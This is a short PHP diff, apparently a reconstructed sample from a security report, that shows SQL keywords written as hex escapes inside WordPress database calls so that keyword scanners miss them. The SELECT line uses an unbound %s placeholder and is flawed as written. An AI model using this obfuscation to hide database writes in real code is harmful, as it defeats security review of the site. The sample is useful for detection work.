@@ -1,0 +1,5 @@
+<?php
+// Reconstruction: SQL keywords hidden as hex escapes (Wordfence, 2026-09).
+$wpdb->query("ST\x41RT TR\x41NS\x41CTION");
+$current = $wpdb->get_var("\x53\x45\x4c\x45\x43\x54 option_value FROM {$table} WHERE option_name = %s LIMIT 1");
+$wpdb->query($wpdb->prepare("\x55P\x44\x41\x54\x45 {$table} SET option_value = %s WHERE option_name = %s", $value, $name));
